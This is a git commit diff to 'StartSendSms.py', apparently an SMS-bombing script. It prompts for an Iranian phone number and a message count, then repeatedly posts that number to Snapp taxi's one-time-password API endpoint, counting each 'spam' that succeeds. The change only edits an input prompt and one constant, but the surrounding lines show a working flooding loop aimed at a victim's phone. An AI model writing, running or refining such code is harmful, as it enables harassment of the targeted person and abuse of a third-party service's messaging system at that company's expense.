af3b8c1ee648c43b965c97a1203647f6ab21eb6a
inalireza <70866306+inalireza@users.noreply.github.com>
2020-12-29 00:45:55 +0330

    Update StartSendSms.py

--- StartSendSms.py
+++ StartSendSms.py
@@ -25,13 +25,13 @@ print("""
  
 """)
 
-phoneNumber = input("Enter phone number +98 :  ")
+phoneNumber = input("Enter phone number +98 0:")
 phoneNumber = str(phoneNumber)
 mydata = {"cellphone": "+98" + phoneNumber}
 urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
 numofmsgs = int(input("Enter number of messages to send: "))
 successspamCount = 0
-failspamCount = 09
+failspamCount = 9
 for i in tqdm(range(numofmsgs)):
     resp = requests.post(urlsend, data=mydata)
     if resp.status_code == 200:
